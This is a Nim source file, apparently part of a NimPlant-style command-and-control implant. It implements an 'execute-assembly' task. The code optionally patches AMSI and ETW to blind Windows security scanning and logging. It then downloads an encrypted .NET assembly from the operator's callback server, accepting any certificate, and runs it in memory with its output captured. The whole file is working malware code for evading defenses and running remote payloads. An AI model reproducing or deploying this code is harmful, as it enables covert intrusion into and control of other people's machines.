import winim/clr except `[]`
from strutils import parseInt
from zippy import uncompress
import base64
import ../../util/crypto
import ../../selfProtections/patches/patchAMSI
import ../../selfProtections/patches/patchETW
import std/strformat # Import for formatting strings
import ../../core/webClientListener # Importar para Request, Response, etc.
import os  # Añadir esta importación aquí
import std/times # Añadir esta importación

# Define custom exceptions if needed
type
  CLRError* = object of CatchableError ## Exception type for CLR-related errors

# Execute a dotnet binary from an encrypted and compressed stream
proc executeAssembly*(li : Listener, args : varargs[string]) : string =
    # Check parameters
    if not args.len >= 3:
        return obf("[-] Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0|1> <BLOCKETW=0|1> [assembly_hash] <arguments>'.")
    
    # Parse arguments
    let
        amsiFlagStr: string = args[0]
        etwFlagStr: string = args[1]
        fileId: string = args[2]
    var
        amsi: bool = false
        etw: bool = false
        assemblyArgs: seq[string] = @[]
    
    try:
        amsi = cast[bool](parseInt(amsiFlagStr))
        etw = cast[bool](parseInt(etwFlagStr))
    except ValueError:
        return obf("[-] Invalid flags. Both BYPASSAMSI and BLOCKETW must be 0 or 1.")
    
    if args.len > 3:
        assemblyArgs = args[3 .. ^1]
    
    result = obf("[*] Executing .NET assembly from memory...\n")
    
    # AMSI Patching
    if amsi:
        var res = patchAMSI.patchAMSI()
        case res:
            of 0: result.add(obf("[+] AMSI patched!\n"))
            of 1: result.add(obf("[-] Error patching AMSI!\n"))
            of 2: result.add(obf("[+] AMSI already patched!\n"))
            else: result.add(obf("[?] Unknown AMSI patch result!\n"))
    
    # ETW Patching
    if etw:
        var res = patchETW.patchETW()
        case res:
            of 0: result.add(obf("[+] ETW patched!\n"))
            of 1: result.add(obf("[-] Error patching ETW!\n"))
            of 2: result.add(obf("[+] ETW already patched!\n"))
            else: result.add(obf("[?] Unknown ETW patch result!\n"))
    
    # Download assembly file using the hash
    var url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.implantCallbackIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId
    
    let req = Request(
        url: parseUrl(url),
        headers: @[
            Header(key: obf("User-Agent"), value: li.userAgent),
            Header(key: obf("X-Request-ID"), value: li.id),
            Header(key: obf("Content-MD5"), value: "execute-assembly"), 
            Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
        ],
        allowAnyHttpsCertificate: true,
    )
    
    let res: Response = fetch(req)
    if res.code != 200:
        return result & obf("[-] Error fetching assembly file: Server returned non-200 code.\n")
    
    try:
        # Decrypt and decompress
        let decrypted = decryptData(res.body, li.UNIQUE_XOR_KEY)
        let decryptedStr = cast[string](decrypted)
        let decompressed = uncompress(decryptedStr)
        
        # Pure NimPlant approach - Keep variables at minimum scope
        result.add(obf("[*] Executing assembly...\n"))
        
        # Load assembly directly
        let assembly = load(convertToByteSeq(decompressed))
        
        # Use block scope to ensure variables are cleaned up quickly
        block:
            # Set up console redirection using minimal code
            let mscor = load(obf("mscorlib"))
            let io = load(obf("System.IO"))
            let Console = mscor.GetType(obf("System.Console"))
            let StringWriter = io.GetType(obf("System.IO.StringWriter"))
            
            var sw = @StringWriter.new()
            var oldConsOut = @Console.Out
            
            try:
                # Set console redirection
                @Console.SetOut(sw)
                
                # Invoke assembly with arguments
                let clrArgs = toCLRVariant(assemblyArgs, VT_BSTR)
                assembly.EntryPoint.Invoke(nil, toCLRVariant([clrArgs]))
                
                # Capture output and restore console immediately
                let output = $sw
                result.add(output)
            finally:
                # Always restore console in finally block
                @Console.SetOut(oldConsOut)
                
                # Explicitly release references
                sw = default(CLRVariant)
        
        # Clear references explicitly
        result.add(obf("\n[+] Execution completed.\n"))
        
    except Exception as e:
        result.add(obf("\n[-] Error: ") & getCurrentExceptionMsg() & "\n")
    
    return result